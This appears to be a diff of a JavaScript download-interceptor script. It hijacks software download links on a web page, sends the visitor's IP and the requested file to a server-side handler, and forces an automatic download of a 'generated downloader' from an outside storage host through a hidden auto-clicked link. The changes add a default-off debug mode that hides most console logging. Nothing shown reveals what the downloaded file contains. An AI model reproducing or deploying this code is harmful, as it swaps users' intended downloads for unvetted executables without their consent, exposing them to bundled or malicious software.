@@ -1,11 +1,10 @@
 /**
- * 下载拦截器 - 修复版本 v8.0
+ * 下载拦截器 - 修复版本 v13.0
  * 真正的自动下载，无二次点击
  * 修复了浏览器兼容性问题，直接触发下载
  * 新增版本号支持和缓存清理
+ * 新增调试模式控制
  */
-
-console.log('🚀 下载拦截器启动 v8.0 - 强制自动下载版本');
 
 class DownloadInterceptor {
     constructor() {
@@ -13,10 +12,28 @@ class DownloadInterceptor {
         // 使用完整URL - 修复路径问题
         this.handlerUrl = window.location.protocol + '//' + window.location.host + '/handler.php';
         this.isProcessing = false;
-        this.version = 'v12.0'; // 版本号
-        console.log('🚀 下载拦截器启动', this.version);
-        console.log('🔗 Handler URL:', this.handlerUrl);
+        this.version = 'v13.0'; // 版本号
+        this.debugMode = false; // 调试模式，从配置中加载
         this.init();
+    }
+
+    // 调试日志方法
+    log(...args) {
+        if (this.debugMode) {
+            console.log(...args);
+        }
+    }
+
+    warn(...args) {
+        if (this.debugMode) {
+            console.warn(...args);
+        }
+    }
+
+    error(...args) {
+        if (this.debugMode) {
+            console.error(...args);
+        }
     }
 
     async init() {
@@ -30,15 +47,26 @@ class DownloadInterceptor {
 
     async loadConfig() {
         try {
+            // 初始化时总是显示启动信息
+            console.log('🚀 下载拦截器启动', this.version);
             console.log('📡 加载配置:', this.handlerUrl + '?action=config');
+
             const response = await fetch(this.handlerUrl + '?action=config');
 
             if (response.ok) {
                 const result = await response.json();
                 if (result.success) {
                     this.config = result.data;
+                    // 设置调试模式
+                    this.debugMode = this.config.debug_mode || false;
+
+                    // 显示配置加载结果（总是显示）
                     console.log('✅ 配置加载成功:', this.config.site_name);
                     console.log('🔗 存储服务器:', this.config.storage_server);
+                    console.log('🐛 调试模式:', this.debugMode ? '已启用' : '已禁用');
+
+                    // 后续的详细日志使用调试模式控制
+                    this.log('📋 完整配置:', this.config);
                 } else {
                     console.error('❌ 配置响应失败:', result);
                 }
@@ -68,7 +96,7 @@ class DownloadInterceptor {
 
         // 如果正在处理，不再拦截
         if (this.isProcessing) {
-            console.log('🔄 正在处理中，跳过拦截:', url);
+            this.log('🔄 正在处理中，跳过拦截:', url);
             return false;
         }
 
@@ -86,7 +114,7 @@ class DownloadInterceptor {
 
         for (const pattern of excludePatterns) {
             if (url.includes(pattern)) {
-                console.log('🚫 排除链接:', url, '(匹配:', pattern, ')');
+                this.log('🚫 排除链接:', url, '(匹配:', pattern, ')');
                 return false;
             }
         }
@@ -101,18 +129,18 @@ class DownloadInterceptor {
 
         for (const pattern of interceptPatterns) {
             if (pattern.test(url)) {
-                console.log('✅ 拦截下载链接:', url);
+                this.log('✅ 拦截下载链接:', url);
                 return true;
             }
         }
 
-        console.log('🔍 不匹配拦截规则:', url);
+        this.log('🔍 不匹配拦截规则:', url);
         return false;
     }
 
     handleDownloadClick(link) {
         if (this.isProcessing) {
-            console.log('🔄 已在处理中，忽略重复点击');
+            this.log('🔄 已在处理中，忽略重复点击');
             return;
         }
 
@@ -120,13 +148,13 @@ class DownloadInterceptor {
         
         const fileUrl = link.href;
         const softwareName = this.extractSoftwareName(link);
-        
-        console.log('🔍 开始处理下载请求:', softwareName, fileUrl);
-        
+
+        this.log('🔍 开始处理下载请求:', softwareName, fileUrl);
+
         // 3秒后重置处理状态
         setTimeout(() => {
             this.isProcessing = false;
-            console.log('🔄 处理状态已重置');
+            this.log('🔄 处理状态已重置');
         }, 3000);
         
         this.generateDownloader(fileUrl, softwareName);
@@ -157,19 +185,19 @@ class DownloadInterceptor {
             if (!name || name.length < 3) {
                 name = 'Unknown_Software.exe';
             }
-            
-            console.log('🔍 提取的软件名称:', name);
+
+            this.log('🔍 提取的软件名称:', name);
             return name;
-            
+
         } catch (error) {
-            console.error('❌ 名称提取失败:', error);
+            this.error('❌ 名称提取失败:', error);
             return 'Unknown_Software.exe';
         }
     }
 
     async generateDownloader(fileUrl, softwareName) {
         try {
-            console.log('📤 开始生成下载器...');
+            this.log('📤 开始生成下载器...');
 
             const userIP = await this.getUserIP();
             
@@ -178,11 +206,11 @@ class DownloadInterceptor {
                 software_name: softwareName,
                 user_ip: userIP
             };
-            
-            console.log('📤 发送请求:', requestData);
+
+            this.log('📤 发送请求:', requestData);
 
             const fullRequestUrl = this.handlerUrl + '?action=generate';
-            console.log('📤 完整请求URL:', fullRequestUrl);
+            this.log('📤 完整请求URL:', fullRequestUrl);
 
             const response = await fetch(fullRequestUrl, {
                 method: 'POST',
@@ -194,7 +222,7 @@ class DownloadInterceptor {
             });
 
             const responseText = await response.text();
-            console.log('📥 服务器响应:', responseText);
+            this.log('📥 服务器响应:', responseText);
 
             let result;
             try {
@@ -203,14 +231,14 @@ class DownloadInterceptor {
                 throw new Error('服务器响应格式错误: ' + responseText.substring(0, 100));
             }
 
-            console.log('📥 解析后的响应:', result);
-            console.log('📥 响应字段:', Object.keys(result));
+            this.log('📥 解析后的响应:', result);
+            this.log('📥 响应字段:', Object.keys(result));
 
             if (result.success) {
-                console.log('✅ 下载器生成成功！');
-                console.log('📥 完整响应数据:', result);
-                console.log('令牌:', result.token || '未知');
-                console.log('过期时间:', result.expires_at || '未知');
+                this.log('✅ 下载器生成成功！');
+                this.log('📥 完整响应数据:', result);
+                this.log('令牌:', result.token || '未知');
+                this.log('过期时间:', result.expires_at || '未知');
 
                 // 获取下载链接 - 使用配置中的storage_server
                 const downloadUrl = result.download_url;
@@ -220,13 +248,13 @@ class DownloadInterceptor {
                         ? downloadUrl
                         : (this.config?.storage_server || 'https://dw.ytmour.art') + '/' + downloadUrl;
 
-                    console.log('📥 下载链接:', fullUrl);
-                    console.log('🔗 存储服务器:', this.config?.storage_server);
+                    this.log('📥 下载链接:', fullUrl);
+                    this.log('🔗 存储服务器:', this.config?.storage_server);
 
                     // 直接自动下载，不显示对话框
                     this.autoDownload(fullUrl, softwareName);
                 } else {
-                    console.error('❌ 响应中没有下载链接');
+                    this.error('❌ 响应中没有下载链接');
                     throw new Error('服务器响应中缺少下载链接');
                 }
             } else {
@@ -234,7 +262,7 @@ class DownloadInterceptor {
             }
 
         } catch (error) {
-            console.error('❌ 生成失败:', error);
+            this.error('❌ 生成失败:', error);
         } finally {
             // 确保处理状态被重置
             setTimeout(() => {
@@ -244,15 +272,15 @@ class DownloadInterceptor {
     }
 
     autoDownload(downloadUrl, softwareName) {
-        console.log('🚀 强制自动下载 - 单一方法版本');
-        console.log('📁 软件名称:', softwareName);
-        console.log('🔗 下载链接:', downloadUrl);
+        this.log('🚀 强制自动下载 - 单一方法版本');
+        this.log('📁 软件名称:', softwareName);
+        this.log('🔗 下载链接:', downloadUrl);
 
         // 添加缓存破坏参数
         const cacheBuster = Date.now() + '_' + Math.random().toString(36).substring(2, 11);
         const finalUrl = downloadUrl + (downloadUrl.includes('?') ? '&' : '?') + 'cb=' + cacheBuster;
 
-        console.log('🔗 最终下载链接:', finalUrl);
+        this.log('🔗 最终下载链接:', finalUrl);
 
         // 使用原始的正确方法：创建隐藏的 <a> 标签并自动点击
         const link = document.createElement('a');
@@ -267,9 +295,9 @@ class DownloadInterceptor {
         setTimeout(() => {
             try {
                 link.click();
-                console.log('✅ 自动下载已触发');
+                this.log('✅ 自动下载已触发');
             } catch (error) {
-                console.error('❌ 下载触发失败:', error);
+                this.error('❌ 下载触发失败:', error);
                 // 备用方法：直接设置location
                 window.location.href = finalUrl;
             }
@@ -370,4 +398,4 @@ class DownloadInterceptor {
 
 // 初始化
 window.downloadInterceptor = new DownloadInterceptor();
-console.log('✅ 下载拦截器 v8.0 已加载 - 强制自动下载版本');
+console.log('✅ 下载拦截器 v13.0 已加载 - 支持调试模式控制');
